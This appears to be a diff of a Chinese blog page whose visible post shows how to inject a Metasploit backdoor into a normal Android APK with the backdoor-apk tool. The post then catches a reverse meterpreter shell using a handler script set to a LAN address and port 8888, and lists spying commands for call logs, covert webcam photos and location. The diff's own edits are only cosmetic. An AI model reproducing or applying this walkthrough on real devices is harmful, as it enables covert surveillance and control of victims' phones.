@@ -16,13 +16,13 @@
 <meta property="og:site_name" content="XiaoTaoist&#39;s Blog">
 <meta property="og:description" content="========================  实验环境： Kali Linux android 同一局域网   生成后门安装依赖环境  apt-get install lib32z1 lib32ncurses5  lib32stdc++6  下载 backdoor-apk  git clone https://github.com/dana-at-cp/backdoor-apk.git  下">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/03/02/backdoor-apk/img/apk_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/03/02/backdoor-apk/img/apk_msf.png">
-<meta property="og:updated_time" content="2018-03-08T06:55:02.134Z">
+<meta property="og:image" content="http://yoursite.com/img/apk_1.png">
+<meta property="og:image" content="http://yoursite.com/img/apk_msf.png">
+<meta property="og:updated_time" content="2018-03-14T01:25:17.760Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="生成apk后门实现msf控制安卓手机">
 <meta name="twitter:description" content="========================  实验环境： Kali Linux android 同一局域网   生成后门安装依赖环境  apt-get install lib32z1 lib32ncurses5  lib32stdc++6  下载 backdoor-apk  git clone https://github.com/dana-at-cp/backdoor-apk.git  下">
-<meta name="twitter:image" content="http://yoursite.com/2018/03/02/backdoor-apk/img/apk_1.png">
+<meta name="twitter:image" content="http://yoursite.com/img/apk_1.png">
   
     <link rel="alternative" href="/atom.xml" title="XiaoTaoist&#39;s Blog" type="application/atom+xml">
   
@@ -199,17 +199,18 @@
 <blockquote>
 <p>cd backdoor-apk/backdoor-apk</p>
 </blockquote>
+<a id="more"></a>
 <p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p>
 <blockquote>
 <p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p>
 </blockquote>
-<p>选择payload<br><img src="img/apk_1.png" alt="apk">  </p>
+<p>选择payload<br><img src="/img/apk_1.png" alt="apk">  </p>
 <p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p>
 <h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p>
 <blockquote>
 <p>msfconsole -r backdoor-apk.rc</p>
 </blockquote>
-<p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p>
+<p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="/img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p>
 <p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
 <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
 <li>[!] Failed to recompile original project with backdoor <ul>
@@ -328,7 +329,7 @@
     </a>
   
   
-    <a href="/2018/02/28/Vimium-use/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2018/02/28/vimium/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">Vimium 入门</div>
       <i class="icon-circle-right"></i>
     </a>
@@ -471,11 +472,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Tools</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -483,7 +484,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+                <a href="javascript:void(0)" class="js-tag color1">Tools</a>
               </li>
             
             <div class="clearfix"></div>
@@ -536,6 +537,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           
             <li class="search-li">
               <a href="https://MiniFullC.github.io" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>MiniFullC</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://ymeow.github.io" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>YMeow</a>
             </li>
           
         </ul>
